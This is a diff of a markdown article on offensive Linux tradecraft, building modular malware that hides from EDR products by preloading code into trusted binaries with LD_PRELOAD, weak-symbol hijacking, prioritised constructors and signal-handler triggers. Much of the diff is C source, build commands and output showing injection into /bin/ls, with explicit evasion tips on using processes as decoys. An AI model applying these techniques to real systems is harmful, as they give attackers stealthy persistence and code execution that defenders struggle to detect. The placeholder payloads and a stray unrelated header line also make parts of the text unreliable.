@@ -30,7 +30,14 @@ _David Hughes, associate professor of entomology and biology at Penn State_
 -----
 ## Introduction
 
-On a recent engagement our team was faced with hiding malware from a commercial EDR on Linux. We wanted to share a few techniques that helped us persist on the target and what led us on a path to creating modularized malware based on linker preloading and in-memory payload interfaces.
+We wanted to share a few techniques that helped us evade a commercial EDR on Linux and persist on the target. This led us on a path to creating modularized malware based on linker preloading and in-memory payload interfaces.
+
+## Problem
+In general, when operating in adversarial environments, we have to accommodate the following contexts:
+- Can we find and preload existing trusted binary with this technique
+- Can we bring a cradle which we can preload with modular malware. The cradle can be very basic and not point to malware by itself.
+
+An so we will approach solving both of these issues with the discussion below. 
 
 ## Objectives
 - Build modular Linux malware, that can evade detection via its use of linker preloading techniques.
@@ -41,8 +48,6 @@ On a recent engagement our team was faced with hiding malware from a commercial 
 ## Roadmap
 
 ### Part 1: Primitives for Working with Offensive Preloading:
-
-We will explore the following practical concepts:
 
 - Showcase and review code techniques available with the Linux linker/loader to assist in achieving the "preload and release" effect in the approved binaries without patching or fully modifying them at runtime.
 - Create malicious library preloads without full knowledge of the internal details of the target binaries.
@@ -62,7 +67,7 @@ We will explore the following practical concepts:
 
 ### Runtime Hooking / Runtime Preloading
 
-*Hooking Tradeoffs*
+*Runtime Hooking API Tradeoffs*
 
 Functionally, hooking an API assumes that you are implementing an API detour to execute foreign logic, and in the process of achieving this you rely on the following:
 
@@ -119,7 +124,10 @@ The .init and .fini sections have a special purpose. If a function is placed in 
 
 When an ELF executable is executed, the system will load in all the shared object files before transferring control to the executable. With the properly constructed `.init` and `.fini` sections, constructors and destructors will be called in the right order.
 
-Code discussion / demo: 
+Code discussion / demo:  
+`make main_init && ./bin/main_init`
+
+File: `main_init.c`:
 
 ```c
 static void init(int argc, char **argv, char **envp) {
@@ -136,7 +144,56 @@ __attribute__((section(".init_array"), used)) static typeof(init) *init_p = init
 __attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;
 
 int main(void) { /* your code here */ return 0; }
+
 ```
+
+```sh
+$make  main_init && ./bin/main_init
+> init
+	main
+< fini
+```
+
+We can split off .init/.fini into a module (shared library) and preload it nto `main()` instead:
+
+
+```c
+#include <stdio.h>
+
+static void init(int argc, char **argv, char **envp) {
+    printf("> l:%s\n", __FUNCTION__);
+}
+
+static void fini(void) {
+    printf("< l:%s\n", __FUNCTION__);
+}
+
+
+__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
+__attribute__((section(".fini_array"), used)) static typeof(fini) *fini_p = fini;
+
+```
+
+``` sh
+$make libinit main && LD_PRELOAD=./lib/libinit.so ./bin/main
+> l:init
+main:  1  2  3 
+< l:fini
+```
+Watch what happens on a preload to a binary that already has `.ini/.fini` routines defined:
+
+```sh
+$make libinit main_init && LD_PRELOAD=./lib/libinit.so ./bin/main_init
+> l:init
+> init
+	main
+< fini
+< l:fini
+```
+
+Notice that the preloaded routines run prior to the onese defined in the target binary. Hijack opportunity.
+
+
 
 #### 0x01: ` __libc_start_main()`
 
@@ -148,11 +205,12 @@ Discussion:
 
 > The `__libc_start_main()` function shall perform any necessary initialization of the execution environment, call the main function with appropriate arguments, and handle the return from main(). If the main() function returns, the return value shall be passed to the exit() function. `__libc_start_main()` is not in the source standard; it is only in the binary standard.
 
-General idea is to hook the real `main()`, execute payload logic and trampoline back to it. Yes, we can use hooking techniques in preloads.
+General idea is to hook the real `main()`, execute payload logic and trampoline back to it. We can use hooking techniques in preloads.
 
 Code discussion / demo:
 
-TBD: file name
+File: src/lcstart.c
+
 
 ```c
 /* Trampoline for the real main() */
@@ -189,17 +247,25 @@ int __libc_start_main(
 }
 ```
 
+```sh
+make libcstart  && LD_PRELOAD=./lib/libcstart.so ./bin/main  1
+```
+
+```
+argv[0] = ./bin/main
+argv[1] = 1
+>__libc_start: main_hook
+main:  1  2  3 
+< hook exited .. 
+
+```
+
 #### 0x02: Weak Symbol References: gcc  `__attribute__((weak))`
 
-Let's talk about creating modular code, with the help of weak linker symbol references resolving at runtime as alternative to `dlopen()` API. 
+In the previous example we have used `dlopen()` API. Defensive instrumentation may hook dynamic linking APIs. We can create modular code that uses weak linker symbol references as an alternative to explicit use of the `dlopen()` API. 
 
-We will also have a discussion on chaining weak references to achieve more dynamic modularization.
+As we talk about the concept we will also cover chaining of weak references to achieve more dynamic modularization.
 
-In general, when operating in adversarial environments, we have to accommodate the following contexts:
-- Can we find and preload existing trusted binary with this technique
-- Can we bring a cradle which we can preload with modular malware. The cradle can be very basic and not point to malware by itself.
-
-An so we will approach solving both of these issues with the discussion below. 
 
 To start, a reference:
 
@@ -211,7 +277,7 @@ To start, a reference:
 
 ##### Ox02:A. Controlled Weak Refs
 
-Suppose that we can drop a rudimentary binary on the disk. Normally, to load logic from shared libraries at runtime, our binary would call`dlopen()`API. If we preload the shared libraries at start and have the binary contain weak references the loader will resolve them at runtime at the time of code access and not before. The defense can take the binary which will be clean. Unless the execution context is known and LD_PRELOAD is seen in the environment, and in memory tables, analysis of the binary itself will not point to dependencies usually seen with `dlopen()`s. 
+Suppose that we can drop a rudimentary binary we control that we can use a as a decoy to the target. Normally, to load logic from shared libraries at runtime, our binary would call`dlopen()`API. If we preload the shared libraries at start and have the binary contain weak references the loader will resolve them at runtime at the time of code access and not before. The defense can take the binary which will be clean. Unless the execution context is known and LD_PRELOAD is seen in the environment, and in memory tables, analysis of the binary itself will not point to dependencies usually seen with `dlopen()`s. 
 
 Example: 
 
@@ -221,38 +287,64 @@ Weak symbols can be created in *your* shim/cradle (controlled by you in your tar
 
 Code discussion / demo:
 
-`main_weakref.c`:
+File: `main_weakref_control.c`:
 
 ```c
 void debug() __attribute__((weak));
+
 int main(void)
 {
-    if (debug) { // IF loaded / resolved 
-        printf("main: debug()\n");
-        debug(); // resolved at runtime
+    if (debug) {
+        printf("main: debug() CALLED\n");
+		debug();
     }
+    else {
+        printf("main: debug() NOT AVAILABLE \n");
+    }
+
     return 0;
 }
+
+
 ```
 
-`libweakref.so`:
+File: `libweakrefcontrol.so`:
+
 ```c
+// Weak ref
 void debug() __attribute__((weak));
-// Weak ref check example. Alternative to dlopen()
+
 void debug(){
-    printf("libweakref.so: debug()\n");
+    printf("weakref SO: debug()\n");
 }
+
 ```
 
 Example:
 
 ```sh
-$LD_PRELOAD=lib/libweakref.so bin/main_weakref
+$make -s libweakref_control  main_weakref_control && LD_PRELOAD=./lib/libweakrefctrl.so ./bin/main_weakref_control
+```
+
+```sh
+main: debug() CALLED
+weakref SO: debug()
+
+```
+
+They look like so in the ELF binary of a shared library, and as patched to the main target as exported. 
+
+```sh
+$ nm ./bin/main_weakref_control  | grep debug
+                 w debug
+
+$ nm ./lib/libweakrefctrl.so  | grep debug
+0000000000001115 W debug
 ```
 
 ##### Ox02:B: Foreign Weak Refs
 
-Addressing the same objective on systems that cannot have external cradle binaries, you can hunt for existing Linux *known good* executables that already may have weak references you can take advantage of and hijack:
+Addressing the same objective on systems that cannot have external cradle binaries uploaded to them, an operator may want to hunt for an existing *known good* executables that already has some weak references to take advantage of and hijack:
 
 For example, most Linux system binaries will be stripped of symbols:
 
@@ -276,7 +368,7 @@ w _ITM_deregisterTMCloneTable
 w _ITM_registerTMCloneTable
 ```
 
-Some product executables are shipped un-stripped (e.g. /usr/bin/java):
+Some product executables are still shipped un-stripped (e.g. /usr/bin/java):
 
 ```sh
 $nm /usr/bin/java | grep 'w '
@@ -284,11 +376,12 @@ w __gmon_start__
 w _Jv_RegisterClasses
 ```
 
-As you can see symbols `__gmon_start__` and `__cxa_finalize` seem to be present and weak. Most importantly, they are consistently present in many target executables. We can preload most of ELF executables with the following code:
+As you can see symbols `__gmon_start__` and `__cxa_finalize` seem to be consistently present and weak. We can preload most of ELF executables with the following code:
 
 Code discussion / demo
 
-`libweakref.so`:
+File: `weakref_foreign.c`:
+
 ```c
 // Injection to any ELF
 void __gmon_start__(){
@@ -313,25 +406,30 @@ void __cxa_finalize() {
 }
 ```
 
+
+```sh
+make -s libweakref_foreign  && LD_PRELOAD=./lib/libweakreffor.so /bin/ls
+
+```
+
 Example:
 
 ```sh
 $LD_PRELOAD=./liblibweakref.so /bin/ls
 ``` 
--or-
+-or as always you could use: -
 ```sh
 $LD_LIBRARY_PATH=$LD_LIBRARY_PATH:../lib LD_PRELOAD=libweakref.so /bin/ls
 ```
 
 ```sh
-$LD_PRELOAD=lib/libweakref.so /bin/ls
 in __gmon_start__ weak hook
 in __gmon_start__ weak hook but already started
 in __gmon_start__ weak hook but already started
 in __gmon_start__ weak hook but already started
 in __gmon_start__ weak hook but already started
-in __gmon_start__ weak hook but already started
-bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
+bin  ext  INSTALL.md  lib  log	Makefile  README.md  src  zafsrv
+
 ```
 
 Note:
@@ -341,6 +439,8 @@ Note:
 As you can see with weak symbols we are not explicitly working with `dlopen()/dlsym()` _RTLD_<>'s. Again we only want our code to execute in the context of a live whitelisted executable using it as a decoy. Liveness of the decoy process (no crash) and proper appearance in the process table is prioritized.
 
 _ProTip_: Also note, some executables do not honor `__cxa_finalize` invocation probably due to implemented `atexit()` handlers. but you could always find other decoys. Also, noone says we have to trigger paylaods soon after the process start. We can wait until the process is about to exit and then trigger in the destructor or in atexti(3) hooks.
+
+As you can see we are losing dependency on hiding behind our pristine targets and slowly preloading binaries that we know nothing about with our code, enslaving them to execute our code, and using them as decoys in the face of inspection.
 
 
 ##### 0x2:C: Chained weakrefs
@@ -355,79 +455,99 @@ Explanation:
 
 Code discussion / demo
 
-`main.c`:
+File: `main_weakref_chained.c`:
+
 ```c
 void debug() __attribute__((weak));
 void mstat() __attribute__((weak)
 int main(void)
 {
     if (debug) {
-        printf("main: debug()\n");
+        printf("main: debug() CALLED\n");
         debug();
+    }
+    else {
+        printf("main: debug() NOT AVAILABLE\n");
     }
 
     if (mstat) {
-        printf("main: test trampoline to mstat()\n");
+        printf("main: test trampoline to chianed mstat()\n");
         mstat();
     }
+
+    fflush(stdout);
+    return 0;
 }
+
 ```
 
-`libweakref.so`:
+File: `weakref_chained1.c`:
+
 ```c
 void debug() __attribute__((weak));
 void mstat() __attribute__((weak)
+
 void debug(){
-    printf("debug()\n");
+    printf("Weakref Lib1: debug()\n");
 
     if (mstat) {
-        printf("debug: mstat()\n");
+        printf("Weakref Lib1: debug: calling chained mstat()\n");
         mstat();
     }
+    else {
+        printf("debug: mstat() NOT AVAILABLE\n");
+    }
 }
+
+
 ```
 
-`libweakref2.so`:
+File: `weakref_chained2.c`:
+
 ```c
 void mstat() __attribute__((weak)
 void mstat(){
-    printf("mstat()\n");
+    printf("Weakref Lib2: mstat()\n");
+    fflush(stdout);
 }
 ```
 
 Example:
 
 ```sh
-$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref
+make -s libweakref_chained main_weakref_chained 
 ```
 
 ```sh
-$LD_PRELOAD=lib/libweakref.so:lib/libweakref2.so ./bin/main_weakref 
-in __gmon_start__ weak hook
-in __gmon_start__ weak hook but already started
-in __gmon_start__ weak hook but already started
-main: debug()
-debug()
-debug: stat()
-mstat()
-main: test trampoline to mstat()
-mstat()
-in __cxa_finalize weak hook
-in __cxa_finalize weak hook but already started
-in __cxa_finalize weak hook but already started
+$ LD_PRELOAD=./lib/libweakrefchain1.so ./bin/main_weakref_chained 
+main: debug() CALLED
+Weakref Lib1: debug()
+debug: mstat() NOT AVAILABLE
 ```
-So as you could see chained preloads work as deep as you need them to work, assisting with EDR inspection evasion.
+
+```sh
+$ LD_PRELOAD=./lib/libweakrefchain1.so:./lib/libweakrefchain2.so ./bin/main_weakref_chained 
+main: debug() CALLED
+Weakref Lib1: debug()
+Weakref Lib1: debug: calling chained mstat()
+    Weakref Lib2: mstat()
+main: test trampoline to chained mstat()
+    Weakref Lib2: mstat()
+
+```
+So as you could see chained preloads work as deep as you need them to work, assisting with evasion.
 
 
 #### 0x3: `.CTOR/.DTOR` via gcc `__attribute__((constructor (P)))` and `__attribute__((destructor (P)))`
 
-So this preload/hook method is the crux of our further payload preload automation chain. This is how we are planning to execute our "preload and release" strategy in a binary agnostic manner. 
+This preload/hook method is an important stepping stone of our further payload preload automation chain. This is how we are planning to execute our "preload and release" strategy, in a target binary agnostic manner. 
 
 Brief Highlights:
 
-- Direct constructors and destructors
-- Chained / prioritized constructors and destructors
-- Hijacking program arguments. 
+- Generic constructors and destructors
+- Chained and Prioritized constructors and destructors
+- Hijacking preloaded program arguments in constructors.
+
 
 [Ref:] (https://gcc.gnu.org/onlinedocs/gccint/Initialization.html)
 
@@ -438,7 +558,7 @@ We can use the constructors and destructors to preload *most* target executables
 
 The modular payload we provide in preloaded libraries executes via constructor releasing the target binary to execute the rest of its logic on its own. We only use the target as a decoy, for now. 
 
-##### 0x03:A Direct constructors and destructors
+##### 0x03:A Generic constructors and destructors
 
 Explanation:
 
@@ -475,19 +595,40 @@ Before main()
 bin  ext  lib  Log.md  Makefile  README.md  run.sh  src  test.sh
 ```
 
-##### 0x3:B Chained / prioritized constructors and destructors
+##### 0x3:B Chained and Prioritized constructors and destructors
 
 Explanation: It turns out that constructors and destructors can have priorities. Based on current documentation priorities range: `101 ... 65535`. So we can potentially override priority of a target constructors/destructors by specifying higher (or lower) priorities in  our preloaded library injects:
 
 Code discussion / demo:
 
-`libmctor.so`
+File: `mctor.c`:
+
 ```c
 void before_main(void) __attribute__((constructor (101)));
-
 void after_main(void) __attribute__((destructor(65534) ));
+
 ```
-This proves useful when target binaries provided protection and anticipated the preload path.
+
+```sh
+make -s libmctor  && LD_PRELOAD=./lib/libmctor.so ./bin/main
+
+```
+
+```sh
+Before main()
+main:  1  2  3 
+After main()
+
+```
+
+```sh
+$ LD_PRELOAD=./lib/libmctor.so /bin/ls
+Before main()
+bin  ext  INSTALL.md  lib  log	Makefile  README.md  src  zafsrv
+
+```
+This proves useful when target binaries provided protection by implementing`.ctor/.dtor` and anticipated the preload path (but not fully).
+> Pro-Tip: always preload at the highest supported priority in your offensive shims.
 
 
 #### 0x3:C Hijacking CTOR arguments.
@@ -511,9 +652,8 @@ Sometimes, it is non-blocking or non-instrumentable, as we can see below. Trigge
 
 ##### 0x4:A Direct external signals / handlers e.g. SIGHUP, SIGUSR1/2
 
-TODO: clearly split off from src/intrp.c  to showcase capability
 
-`libinterrupt.so`:
+File: `intrp.c`:
 
 ```c
 void before_main(void) __attribute__((constructor));
@@ -570,9 +710,11 @@ Some signals and faults are even harder to handle and supervise by EDRs
 
 For example, SIGFPE, if you can self-trigger the fault (e.g. division by 0) and then execute payload in a recovery handler, keeping the decoy process alive, but evading IoC chain detection.
 
+Code discussion / demo:
 Below is the code that does both: unassisted SIGHUP and SIGFPE handling:
 
-Code discussion / demo
+File: `intrp.c`:
+
 ```c
 #include "intrp.h"
 
@@ -583,10 +725,8 @@ void before_main(void)
 {
 
     printf("Before main()\n");
-
     printf("Trigger SIGFPRE handler\n");
     try_division(1,0);
-    setSigHandler(500000);
 
 }
 
@@ -594,20 +734,6 @@ void doWork(void){
 	printf("Executing payloads here ...\n");
 }
 
-void setSigHandler(int sleep_interval){
-
-	printf("Setting SIGHUP Signal handler ...\n");
-    printf("PPID: %d PID: %d \n", getppid(), getpid());
-    signal(SIGHUP, handleSigHup);
-    for (;;) {
-        if (gotint)
-            break;
-        usleep(sleep_interval);
-    }
-	printf("Signal handler got signal ... \n");
-	doWork();
-}
- 
 void handleSigHup(int signal) {
     /*
      * Signal safety: It is not safe to call clock(), printf(),
@@ -710,7 +836,7 @@ $LD_PRELOAD=lib/libinterrupt.so /bin/ls
 ```sh
 $LD_PRELOAD=lib/libinterrupt.so bin/main
 Before main()
-Trigger SIGFPRE handler
+Trigger SIGFPE handler
 In SIGFPE handler
 1 / 0: caught division by zero!
 Executing payloads here ...
@@ -893,14 +1019,9 @@ int main(int argc, char** argv)
 
 ```sh
 ldd invoke_lua
-    linux-vdso.so.1 (0x00007ffd0036a000)
-
     ...
     liblua.so => not found
     ...
-
-    libm.so.6 => /lib/x86_64-linux-gnu/libm.so.6 (0x00007fc0c0cb1000)
-    ....
 ```
 
 > Notice the shared library is missing. This is an opportunity to fill the void with a preload as we have discussed before:
@@ -1187,8 +1308,6 @@ cat<<! 1>&3
 }
 ```
 
-*ZAF Demo* here .... 
-
 And now you know what process `56417` is ;) 
 
 ## The Catch 22: Operationalizing Dynamic Preload Cradles
@@ -1450,18 +1569,17 @@ int fn_no_main() {
     exit(0);
 }
 ```
+## Future
 
-## Summary
+This adventure in modular malware and preloading has just begun. There are many exciting things to be put together, discussed, observed and hacked. 
 
-We have walked through ideas on how to write modular malware suitable for preloading tasks. We have built the preloader with extensible capabilities and features. We have talked about memory-based payload storage and invocation. We have seen how to fetch and execute binaries and its dependencies in memory, and to create offensive services. I certainly hope you have learned something from this as I did and do.
+### Weakened ASLR with preloads
+TODO
 
-This adventure in modular malware and preloading has just begun. There are many exciting things to be put together, discussed, observed and hacked. Stay curious!
+### Xmem attach infection
+TODO
 
-
-The code for both the primitives and for the ZAF Service is open source and will be made available at: 
-
-
-https://github.com/dsnezhkov/zombieant
+Stay curious!
 
 
 ## Refs
